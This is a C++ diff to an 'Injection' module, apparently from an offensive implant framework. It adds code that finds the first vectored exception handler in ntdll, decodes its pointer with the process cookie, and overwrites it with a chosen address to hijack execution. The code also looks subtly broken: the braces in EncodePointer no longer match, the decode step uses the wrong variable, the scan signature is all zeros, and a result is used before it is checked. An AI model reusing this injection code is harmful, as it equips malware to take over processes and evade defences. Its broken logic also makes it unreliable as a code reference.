@@ -56,26 +56,22 @@ namespace Injection {
 
     namespace Veh {
 
-        LPVOID GetFirstHandler(wchar_t *name, const char *signature, const char *mask) {
+        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *signature, const char *mask) {
             HEXANE
 
             LdrpVectorHandlerList *handlers = { };
-            void *handler = { };
+            uintptr_t handler = { };
             uint32_t match = 0;
 
-            const auto ntdll = Memory::Modules::GetModuleEntry(Utils::GetHashFromStringW(name, x_wcslen(name)));
-            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, ntdll->DllBase), ntdll->SizeOfImage, signature, mask))) {
+            if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, module->DllBase), module->SizeOfImage, signature, mask))) {
                 return_defer(ERROR_INCORRECT_ADDRESS);
             }
 
             match += 0xD;
             handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7));
 
-            if (
-                !NT_SUCCESS(Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, ntdll)) ||
-                !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {
-
-                handler = nullptr;
+            if (!NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), R_CAST(void *, handlers->First), &handler, sizeof(void *), nullptr))) {
+                handler = 0;
                 return_defer(ntstatus);
             }
 
@@ -83,21 +79,48 @@ namespace Injection {
             return handler;
         }
 
-        UINT_PTR ObfuscatePointer(uintptr_t handler, const bool encode) {
+        UINT_PTR GetStackCookie() {
+            HEXANE
+            uintptr_t cookie = 0;
+
+            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
+                cookie = 0;
+            }
+
+            return cookie;
+        }
+
+        UINT_PTR EncodePointer(uintptr_t handler, const bool encode) {
             HEXANE
 
             uintptr_t pointer = 0;
             uintptr_t cookie = 0;
 
-            if (!NT_SUCCESS(Ctx->Nt.NtQueryInformationProcess(NtCurrentProcess(), S_CAST(PROCESSINFOCLASS, 0x24), &cookie, 0x4, nullptr))) {
+            if (!(cookie = GetStackCookie())) {
                 return_defer(ntstatus);
-            }
+
             encode
                 ? pointer = _rotr(cookie ^ handler, cookie & 0x1F)
                 : pointer = cookie ^ _rotr(pointer, 0x20 - (cookie & 0x1F));
 
             defer:
             return pointer;
+        }
+
+        LONG OverwriteFirstHandler(const uintptr_t address, const wchar_t *mod_name) {
+            HEXANE
+
+            const auto mod_hash = Utils::GetHashFromStringW(mod_name, x_wcslen(mod_name));
+            const auto ntdll = Memory::Modules::GetModuleEntry(mod_hash);
+
+            const auto entry = Veh::GetFirstHandler(ntdll, "\x00\x00\x00\x00\x00\x00\x00\x00", "xxx00xxx");
+            const auto handler = Veh::EncodePointer(entry, false) + 0x20;
+
+            if (!entry) {
+                return FALSE;
+            }
+
+            return Ctx->Nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), C_PTR(address), sizeof(uintptr_t), nullptr);
         }
     }
 }
